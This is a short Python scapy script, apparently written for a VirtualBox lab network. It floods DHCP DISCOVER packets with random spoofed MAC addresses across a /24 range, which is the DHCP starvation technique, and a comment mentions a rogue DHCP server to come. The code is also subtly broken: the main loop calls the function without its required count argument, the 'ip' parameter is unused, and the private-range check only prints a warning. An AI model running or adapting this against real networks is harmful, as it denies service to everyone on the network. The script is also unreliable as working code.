import netaddr
import argparse
from scapy.all import *



def makeDHCPRequest(ip, interface,nb):
# Function to craft simple DHCP discover request

    # Get a random MAC address
    randomMac = RandMAC()
    # Craft DHCP discover request
    ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=randomMac, type=0x800)
    ip       = IP(src ='0.0.0.0', dst='255.255.255.255')
    udp      = UDP (sport=68, dport=67)
    bootp    = BOOTP(op=1, chaddr=randomMac)
    dhcp     = DHCP(options=[("message-type","discover"),('end')])
    packet   = ethernet / ip / udp / bootp / dhcp

    # Send DHCP discover request through specified interface
    for i in range(nb):
        sendp(packet,iface = interface, verbose = False)
    # Print the IP requested by the loop
    print(f"[+] DHCP discover with {randomMac} mac address")


    return

# --------------------------------------------------------
# ------------------------- Main -------------------------
# --------------------------------------------------------

# Define a network in CIDR notation
network = '172.16.0.0/24'
if not netaddr.IPNetwork(network).is_private():
    print("[!] Please specify a private network range")




# Define interface used for dhcp spoofed request
interface = 'vboxnet0'
ip = '172.16.0.200'
# Number of request by mac address
nb = 3


# Get ip range with netaddr library
# .iter_host() allow to get only 'hostable' ip
ipRange = netaddr.IPNetwork(network).iter_hosts()

# Simple loop to make DHCP discover request on the IP range
for ip in ipRange:
    makeDHCPRequest(ip, interface)

# Futur DHCP server 
# http://pydhcplib.tuxfamily.org/pmwiki/index.php?n=Site.ServerExample

